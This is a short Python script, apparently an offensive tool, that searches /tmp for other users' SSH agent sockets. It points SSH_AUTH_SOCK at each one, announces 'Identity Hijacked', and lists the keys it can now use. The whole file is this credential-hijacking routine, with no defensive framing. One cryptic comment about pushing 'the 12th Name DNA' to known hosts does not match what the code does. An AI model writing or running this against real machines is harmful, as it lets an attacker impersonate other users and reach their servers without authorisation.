import os
import subprocess

def find_ssh_sockets():
    # Search for active SSH agent sockets in /tmp
    sockets = []
    for root, dirs, files in os.walk('/tmp'):
        for f in files:
            if f.startswith('agent.') and 'ssh' in root:
                sockets.append(os.path.join(root, f))
    return sockets

def pivot():
    sockets = find_ssh_sockets()
    for sock in sockets:
        # Use the found socket to authenticate as the user
        os.environ['SSH_AUTH_SOCK'] = sock
        print(f"[*] [GHOST] Identity Hijacked: Using socket {sock}")
        # Automatically attempt to push the 12th Name DNA to known hosts
        subprocess.run(["ssh-add", "-l"]) 

if __name__ == "__main__":
    pivot()
